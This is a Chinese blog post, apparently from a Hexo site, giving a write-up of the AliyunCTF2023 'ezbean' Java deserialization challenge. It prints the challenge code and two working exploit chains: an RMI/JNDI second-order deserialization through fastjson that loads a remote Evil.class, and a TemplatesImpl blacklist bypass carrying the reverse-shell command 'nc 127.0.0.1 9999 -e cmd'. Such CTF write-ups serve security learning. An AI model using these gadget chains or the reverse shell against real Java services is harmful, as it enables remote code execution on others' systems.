@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            Java|AliyunCTF2023-ezbean 两个解法
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="ezbean"><a href="#ezbean" class="headerlink" title="ezbean"></a>ezbean</h1><p>本地复现。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>jdk8u102</p>
+<p>MyBean.java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ctf.ezser.bean;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import javax.management.remote.JMXConnector;</span><br><span class="line"></span><br><span class="line">public class MyBean implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">   private Object url;</span><br><span class="line">   private Object message;</span><br><span class="line">   private JMXConnector conn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public MyBean() &#123;&#125;</span><br><span class="line"></span><br><span class="line">   public MyBean(Object url, Object message) &#123;</span><br><span class="line">      this.url = url;</span><br><span class="line">      this.message = message;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public MyBean(Object url, Object message, JMXConnector conn) &#123;</span><br><span class="line">      this.url = url;</span><br><span class="line">      this.message = message;</span><br><span class="line">      this.conn = conn;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public String getConnect() throws IOException &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">         this.conn.connect();</span><br><span class="line">         return &quot;success&quot;;</span><br><span class="line">      &#125; catch (IOException var2) &#123;</span><br><span class="line">         return &quot;fail&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public void connect() &#123;&#125;</span><br><span class="line"></span><br><span class="line">   public Object getMessage() &#123;</span><br><span class="line">      return this.message;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public void setMessage(Object message) &#123;</span><br><span class="line">      this.message = message;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public Object getUrl() &#123;</span><br><span class="line">      return this.url;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public void setUrl(Object url) &#123;</span><br><span class="line">      this.url = url;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>controller</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ctf.ezser.controller;</span><br><span class="line"></span><br><span class="line">import com.ctf.ezser.utils.MyObjectInputStream;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class IndexController &#123;</span><br><span class="line">        @RequestMapping(&quot;/read&quot;)</span><br><span class="line">        public String read(@RequestParam String data) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                byte[] bytes = Base64.getDecoder().decode(data);</span><br><span class="line">                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);</span><br><span class="line">                MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);</span><br><span class="line">                objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return &quot;error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;success&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>MyObjectInputStream</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ctf.ezser.utils;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InvalidClassException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line">public class MyObjectInputStream extends ObjectInputStream &#123;</span><br><span class="line"></span><br><span class="line">   private static final String[] blacklist = new String[]&#123;</span><br><span class="line">           &quot;java\\.security.*&quot;, &quot;java\\.rmi.*&quot;,  &quot;com\\.fasterxml.*&quot;, &quot;com\\.ctf\\.*&quot;,</span><br><span class="line">           &quot;org\\.springframework.*&quot;, &quot;org\\.yaml.*&quot;, &quot;javax\\.management\\.remote.*&quot;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   public MyObjectInputStream(InputStream inputStream) throws IOException &#123;</span><br><span class="line">      super(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">      if(!contains(cls.getName())) &#123;</span><br><span class="line">         return super.resolveClass(cls);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         throw new InvalidClassException(&quot;Unexpected serialized class&quot;, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public static boolean contains(String targetValue) &#123;</span><br><span class="line">      for (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         if (targetValue.matches(forbiddenPackage))</span><br><span class="line">            return true;</span><br><span class="line">      &#125;</span><br><span class="line">      return false;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2.60&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.25.0-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="rmi-fj二次反序列化"><a href="#rmi-fj二次反序列化" class="headerlink" title="rmi+fj二次反序列化"></a>rmi+fj二次反序列化</h2><p>参考这篇，其中谈到了<code>default constructor not found</code>的问题：</p>
+<p><a target="_blank" rel="noopener" href="https://wustzhb.github.io/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/">https://wustzhb.github.io/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/</a></p>
+<hr>
+<p>开始复现。所有环境都共用一台机。</p>
+<p>exp</p>
+<p>bd执行readObject时要恢复objects，即执行objects的readObject。objects要恢复自身的属性时，自己创建一个SecureObjectInputStream，调用他的readObject恢复自身属性，所以可以绕过题目MyObjectInputStream对<code>java.management.remote</code>的检查，相当于是二次反序列化了。</p>
+<p>bd恢复完objects，调用他的toString。objects的toString会调用getter。</p>
+<p>JSONArray换成JSONObject同样可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void exp3() throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/Foo&quot;);</span><br><span class="line">    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,null);</span><br><span class="line">    MyBean myBean = new MyBean(null,null,rmiConnector);</span><br><span class="line"></span><br><span class="line">    JSONArray objects = new JSONArray();</span><br><span class="line">    objects.add(myBean);</span><br><span class="line"></span><br><span class="line">    BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);</span><br><span class="line">    System.out.println(MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(bd))));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>rmi服务端自己起：</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ethe448.github.io/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/#toc-heading-10">https://ethe448.github.io/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/#toc-heading-10</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ServerExp &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line"></span><br><span class="line">            //一定要以斜杠结尾</span><br><span class="line">            String factoryUrl = &quot;http://127.0.0.1/&quot;;</span><br><span class="line"></span><br><span class="line">            //对应http://127.0.0.1/下的Evil.class</span><br><span class="line">            Reference reference = new Reference(&quot;Evil&quot;,&quot;Evil&quot;, factoryUrl);</span><br><span class="line">            ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(&quot;Foo&quot;, wrapper);</span><br><span class="line"></span><br><span class="line">            System.err.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.err.println(&quot;Server exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Evil.java，编译之后放到80下。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//不可以带包名</span><br><span class="line">public class Evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String commands = &quot;calc&quot;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打三次，不多不少。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/AliyunCTF2023/image-20230616095430667.png" alt="image-20230616095430667.png"><br>此时控制台信息：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/AliyunCTF2023/image-20230616095509810.png" alt="image-20230616095509810.png"></p>
+<h2 id="可用template"><a href="#可用template" class="headerlink" title="可用template?"></a>可用template?</h2><p>我看这题之前刚好看了会fastjson，看到这篇文章，可以绕fastjson的resolveClass的检查：</p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
+<p>用我自己的话讲就是，ArrayList里先放一个template，然后JSONArray会因为这个template而绕过对他自己的template的resolveClass。</p>
+<p>题目黑名单没ban <code>com.sum.*</code>，我自然就想到了用template。题目黑名单里有template则不能用。</p>
+<p>我自己都觉得好奇怪，那这样题目的MyBean岂不是没用了？然后我甚至不敢相信，本地测，确实可以。</p>
+<hr>
+<p>先把环境开起来，然后跑exp。</p>
+<p>为了验证绕过确实是成功的，我写exp1 和 exp2，其中exp1是可绕过的，exp2报：autoType is not support</p>
+<p>想打interceptor内存马，但是提示get参数太长。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ctf.ezser.exp;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONArray;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import unknown.tools.Gadget;</span><br><span class="line">import unknown.tools.MyMethods;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class Exp &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        exp1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void exp1() throws Exception&#123;</span><br><span class="line">        //TemplatesImpl interceptorShell = Gadget.getInterceptorShell();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = Gadget.getTemplateImpl(&quot;nc 127.0.0.1 9999 -e cmd&quot;);</span><br><span class="line">        JSONArray objects = new JSONArray();</span><br><span class="line">        objects.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; objects1 = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        //下面这两个add交换顺序就报：autoType is not support</span><br><span class="line">        objects1.add(templates);</span><br><span class="line">        objects1.add(bd);</span><br><span class="line"></span><br><span class="line">        String data = MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(objects1)));</span><br><span class="line">        System.out.println(data);</span><br><span class="line"></span><br><span class="line">        //MyMethods.unserialize(MyMethods.serialize(objects1));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void exp2() throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = Gadget.getTemplateImpl(&quot;nc 127.0.0.1 9999 -e cmd&quot;);</span><br><span class="line">        JSONArray objects = new JSONArray();</span><br><span class="line">        objects.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String data = MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(bd)));</span><br><span class="line">        System.out.println(data);</span><br><span class="line"></span><br><span class="line">        //MyMethods.unserialize(MyMethods.serialize(bd));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿exp1生成base64：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/AliyunCTF2023/image-20230616092742920.png" alt="image-20230616092742920.png"><br>送进题目，成功弹shell</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/AliyunCTF2023/image-20230616092829613.png" alt="image-20230616092829613.png"><br>此时题目的控制台：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/AliyunCTF2023/image-20230616092923489.png" alt="image-20230616092923489.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezbean"><span class="toc-text">ezbean</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rmi-fj%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">rmi+fj二次反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8template"><span class="toc-text">可用template?</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
